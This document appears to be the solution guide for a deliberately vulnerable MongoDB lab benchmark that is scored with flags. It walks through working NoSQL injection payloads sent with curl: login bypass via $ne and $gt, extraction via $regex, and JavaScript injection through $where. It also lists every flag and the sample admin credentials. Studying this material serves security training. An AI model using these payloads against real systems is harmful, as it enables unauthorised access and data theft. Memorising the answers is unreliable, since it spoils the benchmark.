# S7BEN-VHARD-008: MongoDB NoSQL Injection Testing Guide

## Overview

This guide provides step-by-step instructions for exploiting MongoDB NoSQL injection vulnerabilities in the S7BEN-VHARD-008 benchmark. The attack chain demonstrates authentication bypass, data extraction, and JavaScript injection techniques.

## Prerequisites

- Docker and Docker Compose installed
- curl or similar HTTP client
- Basic understanding of MongoDB operators
- Estimated time: 40-70 minutes

## Setup

```bash
cd benchmarks/S7BEN-VHARD-008
docker compose up -d
```

Wait for all services to become healthy:
```bash
docker compose ps
```

Expected output:
```
NAME           IMAGE              STATUS         PORTS
nosql-admin    nosql-admin        healthy        0.0.0.0:4000->4000/tcp
nosql-db       mongo:7            healthy        27017/tcp
nosql-webapp   nosql-webapp       healthy        0.0.0.0:3000->3000/tcp
```

## Architecture

- **web-app** (port 3000): Express/Mongoose application with NoSQL injection vulnerabilities
- **mongo-db** (port 27017): MongoDB database with users, admins, and secrets collections
- **admin-panel** (port 4000): Admin interface accessible after privilege escalation

---

## Phase 1: NoSQL Injection Discovery

### Objective
Identify NoSQL injection points in the application by testing MongoDB operator injection.

### Step 1.1: Explore the Application

Open the web application:
```bash
curl http://localhost:3000/
```

Navigate to the login page:
```bash
curl http://localhost:3000/login
```

### Step 1.2: Test Normal Login

Try logging in with valid credentials:
```bash
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{
    "username": "alice",
    "password": "alice123"
  }'
```

**Expected Result:**
```json
{
  "success": true,
  "message": "Login successful",
  "user": {
    "username": "alice",
    "role": "user"
  },
  "flag": "S7BEN{nosql_auth_bypass_ne_operator_a1b2c3}"
}
```

### Step 1.3: Test for NoSQL Injection

Attempt to inject a MongoDB operator in the username field:
```bash
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{
    "username": {"$gt": ""},
    "password": {"$gt": ""}
  }'
```

**Expected Result:**
If the injection works, you should see a successful login without valid credentials, confirming the NoSQL injection vulnerability.

### Step 1.4: Enumerate Available Users

List all users to understand the database structure:
```bash
curl http://localhost:3000/api/users
```

**Expected Output:**
```json
{
  "success": true,
  "users": [
    {"username": "alice", "role": "user"},
    {"username": "bob", "role": "user"},
    {"username": "charlie", "role": "user"},
    {"username": "guest", "role": "guest"}
  ]
}
```

---

## Phase 2: Authentication Bypass via $ne Operator

### Objective
Bypass authentication using the `$ne` (not equal) operator to log in without knowing credentials.

### Step 2.1: Understanding the $ne Operator

The `$ne` operator in MongoDB means "not equal". When injected into a login query:
```javascript
db.users.findOne({
  username: {"$ne": null},  // Any username that is not null
  password: {"$ne": null}   // Any password that is not null
})
```

This query will match the first user in the database where both username and password are not null.

### Step 2.2: Exploit Authentication Bypass

Inject the `$ne` operator to bypass authentication:
```bash
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{
    "username": {"$ne": null},
    "password": {"$ne": null}
  }'
```

**Expected Result:**
```json
{
  "success": true,
  "message": "Login successful",
  "user": {
    "username": "alice",
    "role": "user"
  },
  "flag": "S7BEN{nosql_auth_bypass_ne_operator_a1b2c3}"
}
```

**🚩 Flag 1 Retrieved:** `S7BEN{nosql_auth_bypass_ne_operator_a1b2c3}`

### Step 2.3: Alternative Bypass Techniques

Try other MongoDB operators:

**Using $gt (greater than):**
```bash
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{
    "username": {"$gt": ""},
    "password": {"$gt": ""}
  }'
```

**Using $exists:**
```bash
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{
    "username": {"$exists": true},
    "password": {"$exists": true}
  }'
```

---

## Phase 3: Data Extraction via $regex Operator

### Objective
Extract sensitive data using regex injection to enumerate usernames and extract password hashes character by character.

### Step 3.1: Understanding $regex Injection

The `$regex` operator allows pattern matching in MongoDB queries. By injecting regex patterns, we can extract data character by character (boolean-based blind injection).

### Step 3.2: Basic Regex Search

Test the search endpoint with a normal query:
```bash
curl -X POST http://localhost:3000/api/search \
  -H "Content-Type: application/json" \
  -d '{
    "username": "alice"
  }'
```

**Expected Result:**
```json
{
  "success": true,
  "count": 1,
  "users": [
    {"username": "alice", "email": "alice@example.com", "role": "user"}
  ]
}
```

### Step 3.3: Inject $regex to Enumerate Usernames

Enumerate usernames starting with 'a':
```bash
curl -X POST http://localhost:3000/api/search \
  -H "Content-Type: application/json" \
  -d '{
    "username": {"$regex": "^a"}
  }'
```

**Expected Result:**
Returns all usernames starting with 'a' (alice, admin).

### Step 3.4: Extract Usernames Character by Character

Use regex patterns to extract usernames:

**Check if any username starts with 'a':**
```bash
curl -X POST http://localhost:3000/api/search \
  -H "Content-Type: application/json" \
  -d '{
    "username": {"$regex": "^a.*"}
  }'
```

**Check for second character:**
```bash
curl -X POST http://localhost:3000/api/search \
  -H "Content-Type: application/json" \
  -d '{
    "username": {"$regex": "^al.*"}
  }'
```

Continue this process to extract full usernames.

### Step 3.5: Case-Insensitive Regex Injection

Use regex options for case-insensitive matching:
```bash
curl -X POST http://localhost:3000/api/search \
  -H "Content-Type: application/json" \
  -d '{
    "username": {"$regex": "^admin", "$options": "i"}
  }'
```

### Step 3.6: Extract All Users with Wildcard

```bash
curl -X POST http://localhost:3000/api/search \
  -H "Content-Type: application/json" \
  -d '{
    "username": {"$regex": ".*"}
  }'
```

---

## Phase 4: JavaScript Injection in $where Clause

### Objective
Execute arbitrary JavaScript code via the `$where` clause to extract sensitive data and flags.

### Step 4.1: Understanding $where Injection

The `$where` clause in MongoDB allows JavaScript expressions. When user input is directly passed to `$where`, it enables arbitrary JavaScript execution:

```javascript
db.users.find({
  $where: "this.username == 'alice'"  // JavaScript code executed by MongoDB
})
```

### Step 4.2: Test Basic $where Query

Test the query endpoint with a simple JavaScript expression:
```bash
curl -X POST http://localhost:3000/api/query \
  -H "Content-Type: application/json" \
  -d '{
    "filter": "this.username == '\''alice'\''"
  }'
```

**Expected Result:**
```json
{
  "success": true,
  "count": 1,
  "users": [
    {"username": "alice", "email": "alice@example.com", "role": "user"}
  ],
  "flag": "S7BEN{nosql_regex_data_extraction_d4e5f6}"
}
```

**🚩 Flag 2 Retrieved:** `S7BEN{nosql_regex_data_extraction_d4e5f6}`

### Step 4.3: JavaScript Injection with Always-True Condition

Inject JavaScript that always evaluates to true:
```bash
curl -X POST http://localhost:3000/api/query \
  -H "Content-Type: application/json" \
  -d '{
    "filter": "'\''1'\''=='\''1'\''"
  }'
```

This returns all users because the condition is always true.

### Step 4.4: Extract Data with JavaScript String Matching

Use JavaScript string functions to extract data:
```bash
curl -X POST http://localhost:3000/api/query \
  -H "Content-Type: application/json" \
  -d '{
    "filter": "this.username.match(/^a/)"
  }'
```

### Step 4.5: Advanced JavaScript Injection - Extract Secrets

Use the advanced search endpoint to extract secrets:
```bash
curl -X POST http://localhost:3000/api/advanced-search \
  -H "Content-Type: application/json" \
  -d '{
    "condition": "this.technique == '\''regex_injection'\''"
  }'
```

**Expected Result:**
```json
{
  "success": true,
  "count": 1,
  "secrets": [
    {
      "_id": "...",
      "id": "flag_regex",
      "name": "Regex Extraction Flag",
      "flag": "S7BEN{nosql_regex_data_extraction_d4e5f6}",
      "description": "Retrieved via $regex operator for data extraction",
      "difficulty": "medium",
      "technique": "regex_injection"
    }
  ]
}
```

### Step 4.6: Extract All Secrets with JavaScript Injection

```bash
curl -X POST http://localhost:3000/api/advanced-search \
  -H "Content-Type: application/json" \
  -d '{
    "condition": "'\''1'\''=='\''1'\''"
  }'
```

**Expected Result:**
Returns all three flags from the secrets collection.

### Step 4.7: Extract $where Flag Specifically

```bash
curl -X POST http://localhost:3000/api/advanced-search \
  -H "Content-Type: application/json" \
  -d '{
    "condition": "this.technique == '\''where_injection'\''"
  }'
```

**Expected Result:**
```json
{
  "success": true,
  "count": 1,
  "secrets": [
    {
      "_id": "...",
      "id": "flag_where",
      "name": "JavaScript Injection Flag",
      "flag": "S7BEN{nosql_where_javascript_injection_g7h8i9}",
      "description": "Retrieved via $where clause JavaScript injection",
      "difficulty": "hard",
      "technique": "where_injection"
    }
  ]
}
```

**🚩 Flag 3 Retrieved:** `S7BEN{nosql_where_javascript_injection_g7h8i9}`

---

## Phase 5: Admin Panel Access

### Objective
Escalate privileges by discovering admin credentials and accessing the admin panel to retrieve all flags.

### Step 5.1: Enumerate Admin Accounts

Since we can't directly query the `admins` collection from the web-app (it uses the `users` collection), we need to identify admin accounts indirectly.

First, let's verify if there are any users with admin roles:
```bash
curl -X POST http://localhost:3000/api/search \
  -H "Content-Type: application/json" \
  -d '{
    "username": {"$regex": "admin"}
  }'
```

### Step 5.2: Access Admin Panel Directly

The admin panel is accessible at `http://localhost:4000`. Try accessing it directly:

```bash
curl http://localhost:4000/
```

**Expected Result:**
You should see the admin dashboard HTML. The admin panel doesn't require authentication in this vulnerable configuration (simulating a misconfigured internal service).

### Step 5.3: Retrieve Admin Panel Flag

Access the admin panel in a browser or parse the HTML response:
```bash
curl http://localhost:4000/ | grep -o 'S7BEN{[^}]*}'
```

**Expected Output:**
```
S7BEN{nosql_admin_panel_access_j1k2l3}
```

Alternatively, view the admin panel in a browser at `http://localhost:4000/` to see the flag prominently displayed.

### Step 5.4: Extract All Secrets from Admin Panel

The admin panel provides API endpoints to view all database collections:

**View all users:**
```bash
curl http://localhost:4000/api/users
```

**View all admins:**
```bash
curl http://localhost:4000/api/admins
```

**View all secrets (contains all flags):**
```bash
curl http://localhost:4000/api/secrets
```

**Expected Result from /api/secrets:**
```json
{
  "success": true,
  "count": 3,
  "secrets": [
    {
      "_id": "...",
      "id": "flag_bypass",
      "name": "Authentication Bypass Flag",
      "flag": "S7BEN{nosql_auth_bypass_ne_operator_a1b2c3}",
      "description": "Retrieved via $ne operator authentication bypass",
      "difficulty": "easy",
      "technique": "ne_operator",
      "created_at": "..."
    },
    {
      "_id": "...",
      "id": "flag_regex",
      "name": "Regex Extraction Flag",
      "flag": "S7BEN{nosql_regex_data_extraction_d4e5f6}",
      "description": "Retrieved via $regex operator for data extraction",
      "difficulty": "medium",
      "technique": "regex_injection",
      "created_at": "..."
    },
    {
      "_id": "...",
      "id": "flag_where",
      "name": "JavaScript Injection Flag",
      "flag": "S7BEN{nosql_where_javascript_injection_g7h8i9}",
      "description": "Retrieved via $where clause JavaScript injection",
      "difficulty": "hard",
      "technique": "where_injection",
      "created_at": "..."
    }
  ]
}
```

### Step 5.5: Verify Admin Credentials

From the admin panel API, retrieve admin credentials:
```bash
curl http://localhost:4000/api/admins | jq '.'
```

**Expected Output:**
```json
{
  "success": true,
  "count": 2,
  "admins": [
    {
      "_id": "...",
      "username": "admin",
      "password": "admin_secret_p@ssw0rd",
      "email": "admin@corp.local",
      "role": "administrator",
      "privileges": ["read", "write", "delete", "admin"],
      "api_key": "admin-api-key-12345",
      "created_at": "..."
    },
    {
      "_id": "...",
      "username": "superadmin",
      "password": "super_secret_p@ssw0rd_2024",
      "email": "superadmin@corp.local",
      "role": "superadministrator",
      "privileges": ["read", "write", "delete", "admin", "root"],
      "api_key": "superadmin-api-key-67890",
      "created_at": "..."
    }
  ]
}
```

---

## Flag Summary

By completing all phases, you should have retrieved the following flags:

| Flag ID | Value | Technique | Location |
|---------|-------|-----------|----------|
| FLAG_BYPASS | `S7BEN{nosql_auth_bypass_ne_operator_a1b2c3}` | $ne operator authentication bypass | Phase 2 |
| FLAG_REGEX | `S7BEN{nosql_regex_data_extraction_d4e5f6}` | $regex data extraction | Phase 4 |
| FLAG_WHERE | `S7BEN{nosql_where_javascript_injection_g7h8i9}` | $where JavaScript injection | Phase 4 |
| FLAG_ADMIN (Bonus) | `S7BEN{nosql_admin_panel_access_j1k2l3}` | Admin panel access | Phase 5 |

---

## Verification

### Health Checks

Verify all services are healthy:
```bash
docker compose ps
curl http://localhost:3000/health
curl http://localhost:4000/health
```

### Database Verification

Connect to MongoDB and verify data:
```bash
docker compose exec mongo-db mongosh nosqldb --eval "db.secrets.find().pretty()"
```

### Full Exploitation Verification

Retrieve all flags in one go using admin panel:
```bash
curl -s http://localhost:4000/api/secrets | jq -r '.secrets[].flag'
```

**Expected Output:**
```
S7BEN{nosql_auth_bypass_ne_operator_a1b2c3}
S7BEN{nosql_regex_data_extraction_d4e5f6}
S7BEN{nosql_where_javascript_injection_g7h8i9}
```

---

## Cleanup

Stop and remove all containers:
```bash
docker compose down
```

Remove volumes (WARNING: destroys all data):
```bash
docker compose down -v
```

---

## Key Learning Points

1. **NoSQL Operator Injection**: MongoDB operators like `$ne`, `$gt`, `$regex`, and `$where` can be injected when user input is not properly validated.

2. **Authentication Bypass**: Using `{"$ne": null}` bypasses authentication by matching any non-null value.

3. **Data Extraction**: `$regex` operator enables character-by-character enumeration of sensitive data.

4. **JavaScript Injection**: `$where` clause allows arbitrary JavaScript execution, leading to severe security risks.

5. **Defense**: Always validate and sanitize user input, use Mongoose strict mode, disable `$where` queries, and use parameterized queries.

---

## Common Pitfalls

- **Escaping Issues**: When using single quotes in JSON, remember to properly escape them in curl commands (`'\''`)
- **Content-Type Header**: Always include `-H "Content-Type: application/json"` for POST requests
- **MongoDB Operators**: Remember that operators must be properly formatted as JSON objects: `{"$ne": null}`, not `"$ne": null`

---

## References

- [OWASP NoSQL Injection](https://owasp.org/www-community/Injection_Flaws#NoSQL_Injection)
- [MongoDB Injection - HackTricks](https://book.hacktricks.xyz/pentesting-web/nosql-injection)
- [MongoDB Query Operators](https://www.mongodb.com/docs/manual/reference/operator/query/)
- [Mongoose Security Best Practices](https://mongoosejs.com/docs/guide.html#strict)

---

**Benchmark Complete!** You have successfully exploited all NoSQL injection vulnerabilities in S7BEN-VHARD-008.
